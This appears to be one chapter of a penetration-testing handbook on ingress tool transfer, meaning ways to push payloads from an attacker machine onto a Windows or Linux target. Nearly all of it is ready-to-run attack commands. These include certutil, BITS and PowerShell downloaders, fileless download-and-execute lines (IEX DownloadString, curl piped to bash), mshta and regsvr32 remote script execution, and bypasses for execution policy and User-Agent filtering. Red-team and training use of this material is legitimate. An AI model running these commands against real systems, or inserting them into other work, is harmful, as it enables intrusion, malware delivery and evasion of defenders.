# 01 - Attacker → Target (uploading to the target)

> [← README](../../README.md) · [Next section →](02-target-to-attacker.md)

Downloading a payload or tools **onto the target machine**. The pattern is always the same: stand up a server on the attacker box (LHOST), then download on the target (RHOST).

> **Covered in other files:** Netcat - [07-netcat.md](07-netcat.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), TFTP - [12-dns-icmp.md](12-dns-icmp.md), encoding - [10](10-encoding.md).

---

## Navigation

|  |  |
|---|---|
| [How it works](#how-it-works) | [Which method to choose](#which-method-to-choose) |
| [1.💻LHOST - start a distribution server](#1lhost---start-a-distribution-server) | [2.🪟Windows target - downloading (everything on RHOST)](#2windows-target---downloading-everything-on-rhost) |
| [3.🐧Linux target - downloading (everything on RHOST)](#3linux-target---downloading-everything-on-rhost) | [4. Integrity check](#4-integrity-check) |

---

## How it works

```
LHOST (attacker)                       RHOST (target)
  python3 -m http.server 80   ───────▶  certutil -urlcache -f http://LHOST/payload.exe C:\Users\Public\payload.exe
  updog -p 8000               ───────▶  iwr http://LHOST:8000/payload.exe -OutFile C:\Users\Public\payload.exe
  php -S 0.0.0.0:80           ───────▶  wget http://LHOST/payload.sh
```

Any static web server on LHOST will do. On RHOST, pick a method based on what's installed: `certutil`/`curl.exe`/PowerShell (Windows), `wget`/`curl`/`bash`/an interpreter (Linux).

---

## Which method to choose

| Method | OS | When to use it |
|-------|----|-------------|
| `certutil` | Windows | default choice, present everywhere (LOLBin) |
| `curl.exe` | Windows 10+ / Linux | plain HTTP, available out of the box |
| `wget.exe` | Windows (if present) | fallback |
| `bitsadmin` / `Start-BitsTransfer` | Windows | quiet, runs in the background (BITS) |
| `iwr` / `irm` / `WebClient` | Windows | the PowerShell route |
| `mshta` / `regsvr32` | Windows | fileless execution |
| `wget` / `curl` | Linux | default |
| `/dev/tcp` | Linux | no utilities at all |
| `python`/`perl`/`php`/`ruby`/`node` | Linux | an interpreter is present |

> **Important (PowerShell):** `wget` and `curl` in PowerShell are **aliases** for `Invoke-WebRequest`, not the GNU tools. That's why `wget -O`/`curl -o` don't work there. You need the real `wget.exe` / `curl.exe` (or `iwr`).

---

## 1.💻LHOST - start a distribution server

### Python

**Python 3 - port 80:**
```bash
python3 -m http.server 80
```

**Python 3 - port 8000 on all interfaces:**
```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

**Python 2:**
```bash
python2 -m SimpleHTTPServer 80
```

> `python3 -m http.server` is HTTP/1.0 and does not support `Range`: BITS needs `/dynamic` (`bitsadmin`) or `-Dynamic` (`Start-BitsTransfer`), or use Ruby/Busybox/nginx.

### PHP

**PHP built-in server:**
```bash
php -S 0.0.0.0:80
```

> `php -S` has no `Range` support either.

### Ruby

**Ruby WEBrick:**
```bash
ruby -run -e httpd . -p 80
```

**Ruby WEBrick on port 8000 (no root):**
```bash
ruby -run -e httpd . -p 8000
```

> WEBrick speaks HTTP/1.1 and supports `Range`, so it works with BITS (`bitsadmin`, `Start-BitsTransfer`) without `/dynamic` or `-Dynamic`.

### Busybox

**busybox httpd:**
```bash
busybox httpd -f -p 80
```

**busybox httpd on port 8000 (no root):**
```bash
busybox httpd -f -p 8000
```

> `busybox httpd` also supports `Range` - BITS-friendly.

### updog - a modern server

**Install and run:**
```bash
pipx install updog && updog -d . -p 8000
```

**With a password and TLS:**
```bash
updog -d . -p 8443 --ssl --password 'S3cret'
```

> `updog` answers a Range request with `206` (it may omit `Accept-Ranges`), so BITS normal works.

### nginx

**Serve static files with nginx:**
```bash
sudo cp payload.exe /var/www/html/ && sudo systemctl start nginx
```

**nginx in Docker (if docker is available):**
```bash
docker run --rm -p 80:80 -v "$PWD:/usr/share/nginx/html:ro" nginx
```

**Python in Docker:**
```bash
docker run --rm -p 80:8000 -v "$PWD:/srv" -w /srv python:3 python -m http.server 8000
```

### HTTPS - when the target only downloads over TLS

**Generate a self-signed certificate:**
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**Serve files over HTTPS (`-WWW` serves files from the current directory):**
```bash
openssl s_server -accept 443 -cert server.pem -key server.pem -WWW
```

### Expose the server publicly (if the target can't reach LHOST directly)

**cloudflared - public URL pointing at our localhost:**
```bash
cloudflared tunnel --url http://localhost:8000
```

**ngrok - an alternative:**
```bash
ngrok http 8000
```

---

## 2.🪟Windows target - downloading (everything on RHOST)

### Certutil

The most reliable download on Windows - a legitimate system binary.

**Basic download:**
```cmd
certutil -urlcache -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**With a non-standard port:**
```cmd
certutil -urlcache -f http://%LHOST%:1337/payload.exe C:\Users\Public\payload.exe
```

**The `-split` variant (sometimes downloads where the plain one fails):**
```cmd
certutil -urlcache -split -f http://%LHOST%:1337/payload.exe C:\Users\Public\payload.exe
```

**Decode a base64 file (see [10 - Encoding](10-encoding.md)):**
```cmd
certutil -decode encoded.txt C:\Users\Public\decoded.exe
```

### Curl / wget (CMD, Windows 10+)

`curl` ships with Windows 10+; `wget` only works if `wget.exe` is present.

> On Windows use an absolute output path (`-o C:\Users\Public\payload.exe`). A relative name lands in the current directory - often `System32` in an elevated shell.

**curl.exe - download a file:**
```cmd
curl http://%LHOST%:1337/payload.exe -o C:\Users\Public\payload.exe
```

**curl.exe - ignore the self-signed cert:**
```cmd
curl -k https://%LHOST%/payload.exe -o C:\Users\Public\payload.exe
```

**wget.exe - if available:**
```cmd
wget http://%LHOST%:1337/payload.exe -O C:\Users\Public\payload.exe
```

### BITSAdmin (CMD)

Downloads through the BITS background service - quiet, but sometimes blocked by policy.

> **BITS normal needs a server that honors `Range`.** `python3 -m http.server` and `php -S` answer a Range request with `200` and the full file, so BITS fails with `0x80200013` (`BG_E_INSUFFICIENT_RANGE_SUPPORT`).
>
> `Accept-Ranges` is only a hint: some servers (for example `updog`/Werkzeug) return `206` without advertising it, and BITS normal still works.
>
> | LHOST server | Range probe | BITS normal |
> |---|---|---|
> | `busybox httpd -f -p 8000` | `206` | works |
> | `ruby -run -e httpd . -p 8000` | `206` | works |
> | `nginx` (section 1) | `206` | works |
> | `updog -d . -p 8000` | `206` (may omit `Accept-Ranges`) | works |
> | `python3 -m http.server` | `200` | use `/dynamic` or `-Dynamic` |
> | `php -S` | `200` | use `/dynamic` or `-Dynamic` |

**Check the server before blaming BITS:**
```bash
curl -s -D- -o /dev/null -H 'Range: bytes=0-9' http://$LHOST:8000/payload.exe
```
`206 Partial Content` means the server honors ranges; `200 OK` means it does not - use `/dynamic`/`-Dynamic` or another server.

> `Start-BitsTransfer` has `-Dynamic` for the same relaxation - use it against `python3 -m http.server`.

**Download with high priority (range-capable server):**
```cmd
bitsadmin /transfer job /download /priority high http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**`python3 -m http.server` / `php -S` - add `/dynamic`:**
```cmd
bitsadmin /transfer job /download /priority high /dynamic http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

> `/dynamic` sets `BITS_JOB_PROPERTY_DYNAMIC_CONTENT`, which relaxes the server-side range requirement. If the job still fails, switch to `busybox`/`ruby`/`nginx`; `certutil -urlcache` works with any server as a fallback.
>
> Ready-made matrix: [`scripts/Windows-download-test.ps1`](../../scripts/Windows-download-test.ps1) - default stops at the first working method; `-NoLogs` = quiet `Done!`; `-Log` = quick log; `-LOLBINS` = only LOLBins; `-All` = full matrix + log.

### Start-BitsTransfer (PowerShell)

> **About `${LHOST}`:** this is your attacker IP. The braced form works both before `/` and before `:port` (`${LHOST}:1337`), so the examples use it everywhere. Every PowerShell command below also has a literal-IP variant in a comment; `192.168.2.5` is an example LHOST - replace it with yours. On Windows always give an absolute destination: a relative name is written to the current directory (often `C:\Windows\System32` in an elevated shell) - the examples below use `C:\Users\Public\`.

Same as BITSAdmin, but from PowerShell.

> **Against `python3 -m http.server` add `-Dynamic`.** `Start-BitsTransfer` uses the same BITS engine and will hit `0x80200013` without it. `-Dynamic` relaxes the server-side range requirement; alternatively serve with `busybox httpd -f -p 8000` or `ruby -run -e httpd . -p 8000`.

**Download a file:**
```powershell
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe"
# literal IP:
# Start-BitsTransfer -Source "http://192.168.2.5/payload.exe" -Destination "C:\Users\Public\payload.exe"
```

**From a server without Range support (`-Dynamic`):**
```powershell
Start-BitsTransfer -Dynamic -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe"
# literal IP:
# Start-BitsTransfer -Dynamic -Source "http://192.168.2.5/payload.exe" -Destination "C:\Users\Public\payload.exe"
```

**Through the system proxy:**
```powershell
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -ProxyUsage SystemDefault
# literal IP:
# Start-BitsTransfer -Source "http://192.168.2.5/payload.exe" -Destination "C:\Users\Public\payload.exe" -ProxyUsage SystemDefault
```

### PowerShell - Invoke-WebRequest (`iwr`)

The standard PowerShell HTTP downloader (full form plus the `iwr` alias).

**Full form:**
```powershell
Invoke-WebRequest -Uri "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# Invoke-WebRequest -Uri "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe
```

**Short alias:**
```powershell
iwr "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# iwr "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe
```

**With a non-standard port - use `${LHOST}` before the colon:**
```powershell
Invoke-WebRequest -Uri "http://${LHOST}:1337/payload.exe" -OutFile C:\Users\Public\payload.exe -UseBasicParsing
# literal IP:
# Invoke-WebRequest -Uri "http://192.168.2.5:1337/payload.exe" -OutFile C:\Users\Public\payload.exe -UseBasicParsing
```

**Without `-UseBasicParsing` (PS 6+):**
```powershell
iwr "http://${LHOST}:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# iwr "http://192.168.2.5:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
```

### PowerShell - Invoke-RestMethod (`irm`)

Designed for REST APIs (it parses JSON/XML itself), but it downloads files just as well - and often gets through where `iwr` is blocked.

**Download a file:**
```powershell
Invoke-RestMethod "http://${LHOST}:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# Invoke-RestMethod "http://192.168.2.5:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
```

### PowerShell - WebClient

A .NET classic - works even on old PowerShell 2.0.

**Basic download:**
```powershell
(New-Object Net.WebClient).DownloadFile("http://${LHOST}/payload.exe","C:\Users\Public\payload.exe")
# literal IP:
# (New-Object Net.WebClient).DownloadFile("http://192.168.2.5/payload.exe","C:\Users\Public\payload.exe")
```

**With a non-standard port:**
```powershell
(New-Object Net.WebClient).DownloadFile("http://${LHOST}:1337/payload.exe", "C:\Users\Public\file3.exe")
# literal IP:
# (New-Object Net.WebClient).DownloadFile("http://192.168.2.5:1337/payload.exe", "C:\Users\Public\file3.exe")
```

### PowerShell - System.Net.WebRequest (low level)

The most raw approach - for when even WebClient is blocked.

**Stream it to a file:**
```powershell
$w=[Net.WebRequest]::Create("http://${LHOST}:1337/payload.exe");$r=$w.GetResponse();$s=$r.GetResponseStream();$f=[IO.File]::Create("C:\Users\Public\file4.exe");$s.CopyTo($f);$f.Close();$s.Close()
# literal IP:
# $w=[Net.WebRequest]::Create("http://192.168.2.5:1337/payload.exe");$r=$w.GetResponse();$s=$r.GetResponseStream();$f=[IO.File]::Create("C:\Users\Public\file4.exe");$s.CopyTo($f);$f.Close();$s.Close()
```

### PowerShell - through the system proxy

Download through the corporate proxy using the current user's credentials - a common reason downloads fail on a corporate network.

**WebClient through the proxy:**
```powershell
$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $wc.DownloadFile("http://${LHOST}:1337/payload.exe","C:\Users\Public\payload.exe")
# literal IP:
# $wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $wc.DownloadFile("http://192.168.2.5:1337/payload.exe","C:\Users\Public\payload.exe")
```

### PowerShell - User-Agent and blacklist bypass

Many filters block on User-Agent, so we send a browser one.

**iwr with a browser User-Agent:**
```powershell
iwr "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
# literal IP:
# iwr "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

**WebClient with headers:**
```powershell
$wc=New-Object Net.WebClient; $wc.Headers.Add("User-Agent","Mozilla/5.0"); $wc.DownloadFile("http://${LHOST}/payload.exe","C:\Users\Public\payload.exe")
# literal IP:
# $wc=New-Object Net.WebClient; $wc.Headers.Add("User-Agent","Mozilla/5.0"); $wc.DownloadFile("http://192.168.2.5/payload.exe","C:\Users\Public\payload.exe")
```

**Invoke-WebRequest with custom headers:**
```powershell
iwr "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe -Headers @{ "User-Agent"="Mozilla/5.0"; "Referer"="http://${LHOST}/" }
# literal IP:
# iwr "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe -Headers @{ "User-Agent"="Mozilla/5.0"; "Referer"="http://192.168.2.5/" }
```

### PowerShell - short form and execution policy bypass

Run from cmd in a single line, plus bypassing the policy when a `.ps1` won't execute.

**Short form:**
```cmd
powershell -c "iwr http://%LHOST%/payload.exe -OutFile C:\Users\Public\payload.exe"
```

**Execution policy bypass:**
```cmd
powershell -ep bypass -c "iwr http://%LHOST%/payload.exe -OutFile C:\Users\Public\payload.exe"
```

**Download and immediately run a `.ps1`:**
```cmd
powershell -ep bypass -c "iwr http://%LHOST%:1337/winPEAS.ps1 -OutFile C:\Users\Public\s.ps1; & C:\Users\Public\s.ps1"
```

### PowerShell - fileless (download and run in memory)

The script runs straight in RAM, nothing touches disk - fewer traces for AV.

**WebClient.DownloadString + IEX:**
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://${LHOST}/script.ps1")
# literal IP:
# IEX(New-Object Net.WebClient).DownloadString("http://192.168.2.5/script.ps1")
```

**iwr + iex:**
```powershell
iex(iwr "http://${LHOST}/script.ps1" -UseBasicParsing)
# literal IP:
# iex(iwr "http://192.168.2.5/script.ps1" -UseBasicParsing)
```

**With a non-standard port:**
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://${LHOST}:1337/winPEAS.ps1")
# literal IP:
# IEX(New-Object Net.WebClient).DownloadString("http://192.168.2.5:1337/winPEAS.ps1")
```

**From cmd in a single line:**
```cmd
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://%LHOST%:1337/winPEAS.ps1')"
```

Useful gist: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

### mshta - fileless execution

`mshta.exe` can fetch and run an HTA/script from a URL.

**Run a remote HTA:**
```cmd
mshta http://%LHOST%/payload.hta
```

**Inline VBScript (swap `calc` for your payload):**
```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")
```

### regsvr32 - Squiblydoo (SCT over URL)

`regsvr32` pulls and executes a `.sct` script over HTTP without writing to disk.

**LHOST - prepare `payload.sct`:**
```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="p" classid="{00000000-0000-0000-0000-000000000000}"></registration>
  <script language="JScript">
    <![CDATA[ new ActiveXObject("WScript.Shell").Run("calc"); ]]>
  </script>
</scriptlet>
```

**RHOST - execute:**
```cmd
regsvr32 /s /n /u /i:http://%LHOST%/payload.sct scrobj.dll
```

### desktopimgdownldr - LOLBin download

The built-in wallpaper utility can download a file from a URL. It drops it in `%SystemRoot%\Personalization\LockScreenImage\` and sets it as the lock screen.

**Download a file:**
```cmd
desktopimgdownldr.exe /lockscreenurl:http://%LHOST%/payload.exe /eventName:foo
```

**Change the save directory by overriding `SYSTEMROOT`:**
```cmd
set "SYSTEMROOT=C:\Windows\Temp" && desktopimgdownldr.exe /lockscreenurl:http://%LHOST%/payload.exe /eventName:foo
```

> **Side effect - changes system state.** It writes `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP` (`LockScreenImageUrl`, `LockScreenImagePath`, `LockScreenImageStatus`) and changes the lock screen. It is not destructive, but it is not stealthy either; the registry keys stay until you restore the previous lock screen or remove them. May require admin for the HKLM write - lab only.
>
> The tester runs it only with `-Danger`; `-All` excludes danger-tagged methods. See [scripts/README.md](../../scripts/README.md).

### VBScript

**Create `wget.vbs`:**
```vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**Download any file:**
```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### JavaScript

**Create `wget.js`:**
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**Download any file:**
```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### SMB copy (quick reference)

> Full SMB server setup is in [03-smb.md](03-smb.md).

**copy / xcopy from a share:**
```cmd
copy \\%LHOST%\share\payload.exe C:\Users\Public\payload.exe
```

**xcopy:**
```cmd
xcopy \\%LHOST%\share\payload.exe C:\Users\Public\
```

**Mount the drive and copy:**
```cmd
net use Z: \\%LHOST%\share && copy Z:\payload.exe C:\Users\Public\
```

**With credentials:**
```cmd
net use Z: \\%LHOST%\share /user:test test
```

---

## 3.🐧Linux target - downloading (everything on RHOST)

### Wget

Present on almost every Linux box - the most familiar option.

**Plain download:**
```bash
wget http://$LHOST/payload.sh
```

**To a specific path:**
```bash
wget http://$LHOST/payload.sh -O /tmp/payload.sh
```

**Quiet mode:**
```bash
wget -q http://$LHOST/payload.sh -O /tmp/payload.sh
```

**Resume a partial download:**
```bash
wget -c http://$LHOST/largefile.tar
```

**With a browser User-Agent (blacklist bypass):**
```bash
wget -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://$LHOST/payload.sh -O /tmp/payload.sh
```

### Curl

More versatile than wget: it can pipe into bash and send POST.

**Download to a file:**
```bash
curl http://$LHOST/payload.sh -o /tmp/payload.sh
```

**Download and run immediately:**
```bash
curl http://$LHOST/payload.sh | bash
```

**Follow redirects:**
```bash
curl -L http://$LHOST/payload.sh -o payload.sh
```

**With authentication:**
```bash
curl -u user:pass http://$LHOST/payload.sh -o payload.sh
```

**Self-signed HTTPS:**
```bash
curl -k https://$LHOST/payload.sh -o payload.sh
```

**With a browser User-Agent:**
```bash
curl -A "Mozilla/5.0 (X11; Linux x86_64)" http://$LHOST/payload.sh -o payload.sh
```

### Bash /dev/tcp

When there is nothing at all on the box, download with bash built-ins. This only works in **bash**; `sh`/`dash` does not have `/dev/tcp`.

**First, start a server on LHOST.** The commands below run on the target (RHOST), while the file lives on the attacker (LHOST).

Option 1 - HTTP server (simplest for files):
```bash
# LHOST: from the directory containing the payload
# port 80 requires root; without root use 8000 and change the URL
python3 -m http.server 80
```

Option 2 - plain TCP server with nc (no HTTP headers):
```bash
# LHOST: serve the file and close the connection
nc -lvnp 9000 < payload.sh
```

```bash
# RHOST: receive the file over TCP
cat < /dev/tcp/$LHOST/9000 > payload.sh
```

The examples below use an HTTP server on LHOST.

**Plain GET (headers stay in the file):**
```bash
cat < /dev/tcp/$LHOST/80 > payload.sh
```

**One-liner (GET + strip the HTTP headers right away):**
```bash
bash -c "exec 3<>/dev/tcp/$LHOST/80; printf 'GET /payload.sh HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n' '$LHOST' >&3; sed '1,/^\r*\$/d' <&3 > /tmp/payload.sh; exec 3<&-"
```

**Step by step - open the socket:**
```bash
exec 3<>/dev/tcp/$LHOST/80
```

**Step by step - send the GET request:**
```bash
echo -e "GET /payload.sh HTTP/1.1\n\n" >&3
```

**Step by step - read the response:**
```bash
cat <&3
```

> If the binary "breaks", the HTTP headers probably ended up in the file. Drop the `sed` and trim them by hand.

### Python

Available on most Linux hosts (py3, sometimes py2).

**Python 3:**
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST/payload.sh', '/tmp/payload.sh')"
```

**Python 2:**
```bash
python2 -c "import urllib; urllib.urlretrieve('http://$LHOST/payload.sh', '/tmp/payload.sh')"
```

### Perl

A fallback when perl is there but wget/curl are not.

**LWP::Simple - download to a file:**
```bash
perl -e 'use LWP::Simple; getstore("http://".$ENV{LHOST}."/payload.sh", "/tmp/payload.sh");'
```

**Download a public script:**
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### PHP

PHP is almost always installed on web servers, so use it to download.

**file_get_contents + file_put_contents:**
```bash
php -r 'file_put_contents("/tmp/payload.sh", file_get_contents("http://".getenv("LHOST")."/payload.sh"));'
```

**Download a public script:**
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**Download with fopen (streaming, for large files):**
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**Download and pipe straight into bash:**
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby

If ruby is on the box (common on dev machines).

**Download to a file:**
```bash
ruby -e 'require "net/http"; File.write("/tmp/payload.sh", Net::HTTP.get(URI("http://#{ENV["LHOST"]}/payload.sh")))'
```

**Download a public script:**
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### Node.js

Often present on dev servers and in containers.

**Download to a file:**
```bash
node -e 'require("http").get("http://'"$LHOST"'/payload.sh",r=>r.pipe(require("fs").createWriteStream("/tmp/payload.sh")))'
```

**HTTPS:**
```bash
node -e 'require("https").get("https://'"$LHOST"'/payload.sh",r=>r.pipe(require("fs").createWriteStream("/tmp/payload.sh")))'
```

### busybox wget

Minimal systems (routers, IoT, Alpine) - busybox has wget.

**Download:**
```bash
busybox wget http://$LHOST/payload.sh -O /tmp/payload.sh
```

### git clone

If the payload lives in a repo (and `git` is installed).

**Clone the repository:**
```bash
git clone https://github.com/user/tools.git /tmp/tools
```

---

## 4. Integrity check

Compare the hash on both ends, otherwise a corrupted file goes unnoticed.

**LHOST / Linux RHOST:**
```bash
md5sum payload.exe
```

**Windows (PowerShell):**
```powershell
Get-FileHash C:\Users\Public\payload.exe -Algorithm md5
```

**Windows (CMD):**
```cmd
certutil -hashfile payload.exe MD5
```

---

**See also:** [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [09 - LOLBins](09-lolbins.md) · [10 - Encoding](10-encoding.md) · [14 - Troubleshooting](14-troubleshooting.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

More detail - [README](../../README.md#notation-and-variables).

---

[← Back to the handbook](../../README.md)
